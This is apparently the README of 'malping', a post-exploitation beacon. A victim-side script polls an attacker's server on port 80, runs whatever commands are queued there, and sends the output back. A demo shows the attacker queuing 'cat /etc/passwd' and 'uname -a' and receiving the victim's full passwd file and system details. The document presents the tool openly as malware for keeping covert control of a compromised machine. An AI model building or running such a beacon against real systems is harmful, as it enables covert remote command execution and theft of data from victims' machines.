# malping

A simple implementation of a post-exploitation beacon.

## overview

`malping.py` is the script that runs on the victim machine, theoretically
hidden or obscured in some way. Based on arguments, it sends a ping of sorts
to a specified ip (attacker) at a desired frequency, where `mp_server.py` may
or may not be running. As soon as `mp_server.py` is executed on the attacker's
machine, `malping.py` will be able to connect to the server and essentially ask
for a command to execute, based on arguments passed to `mp_server.py`.
`malping.py` will obediently execute the command and send the stdout back to
the server.

The server runs on port 80 of the attacker's machine and since that is the
commonly used port for web traffic, it is highly likely the victim will be able
to connect back.

## demo

The attacker has gotten access to the victim's machine and downloaded and
executed malping. He/she does not have the server running at this point,
but it's ok, malping waits patiently. Eventually the attacker is ready and
starts the server, telling malping to execute the commands, "cat /etc/passwd"
and "uname -a". The next time malping pings the server it sees the commands
queued to be executed and does so, one at a time. When all the commands have
been executed, the server stops, but malping keeps listening.

Victim's Machine (5.4.3.2):

```
$ ./malping.py 1.2.3.4 5
[+] Malping started with delay of 5 seconds.
[!] (2014-05-07 21:52:29.475144) Could not connect to server. Waiting...
[!] (2014-05-07 21:52:34.475740) Could not connect to server. Waiting...
[!] (2014-05-07 21:52:39.475874) Could not connect to server. Waiting...
[!] (2014-05-07 21:52:44.477319) Could not connect to server. Waiting...
[!] (2014-05-07 21:52:49.478246) Could not connect to server. Waiting...
[+] (2014-05-07 21:52:54.480326) Executing "cat /etc/passwd"
[+] (2014-05-07 21:52:59.489891) Executing "uname -a"
[!] (2014-05-07 21:53:04.496380) Could not connect to server. Waiting...
[!] (2014-05-07 21:53:09.497329) Could not connect to server. Waiting...
[!] (2014-05-07 21:53:14.498801) Could not connect to server. Waiting...
```

Attacker's Machine (1.2.3.4):

```
$ sudo ./mp_server.py "cat /etc/passwd" "uname -a"
[+] Malping server started on 80.
[i] Connected By: ('5.4.3.2', 52252) at 2014-05-07 21:52:54.480167
[+] Sending Command: cat /etc/passwd
[+] Command Stdout:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
lol:x:1001:1001::/home/lol:/bin/bash
[i] Connected By: ('5.4.3.2', 52253) at 2014-05-07 21:52:59.489664
[+] Sending Command: uname -a
[+] Command Stdout:
Linux lolServer 3.8.0-29-generic #42~precise1-Ubuntu SMP Wed May 07 16:19:23 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

[-] Finished with commands
```
